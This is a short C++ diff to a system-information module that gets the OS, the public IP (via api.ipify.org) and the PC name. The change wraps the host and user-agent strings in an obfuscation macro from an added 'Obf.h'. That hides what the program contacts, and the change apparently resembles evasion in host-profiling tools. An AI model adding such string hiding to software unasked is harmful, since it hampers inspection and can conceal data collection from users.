@@ -24,6 +24,7 @@ SOFTWARE.
 
 #include "Information.h"
 #include "Requests.h"
+#include "Obf.h"
 #include <intrin.h>
 
 std::string Information::GetOS() {
@@ -59,7 +60,9 @@ std::string Information::GetOS() {
 }
 
 std::string Information::GetIP() {
-	return Requests::GetRequest("api.ipify.org", "4B4DB4B3");
+	std::string host = S("api.ipify.org");
+	std::string ua   = S("4B4DB4B3");
+	return Requests::GetRequest(host.c_str(), ua.c_str());
 }
 
 std::string Information::GetPCName() {
